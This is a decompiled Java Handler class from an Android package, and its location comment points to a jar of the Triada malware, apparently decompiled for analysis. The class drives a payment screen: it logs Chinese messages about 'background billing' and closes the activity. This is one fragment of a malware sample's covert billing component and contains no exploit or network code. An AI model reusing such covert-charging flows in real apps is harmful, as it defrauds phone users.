package com.android.essdk.eyou;

import android.os.Handler;
import android.os.Message;
import com.android.essdk.eyou.e.b;

class a extends Handler {
  a(EPayActivity paramEPayActivity) {}
  
  public void handleMessage(Message paramMessage) {
    switch (paramMessage.what) {
      default:
        return;
      case 0:
        b.b("EPayActivty", "显示支付界面 msg == 0");
        EPayActivity.a(this.a);
        EPayActivity.b(this.a).a("正在计费，请稍后");
        EPayActivity.c(this.a);
        EPayActivity.a(this.a, false);
      case 1:
        b.b("EPayActivty", "后台计费，显示加载页面 msg == 1 ");
        EPayActivity.d(this.a);
        EPayActivity.a(this.a, true);
        EPayActivity.b(this.a).a("正在计费，请稍后");
      case 2:
        b.b("EPayActivty", "Handler 收到关闭界面 msg == 2");
        EPayActivity.e(this.a);
      case 3:
        break;
    } 
    b.b("EPayActivty", "Handler 直接关闭界面 msg == 3 ——关闭");
    this.a.finish();
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */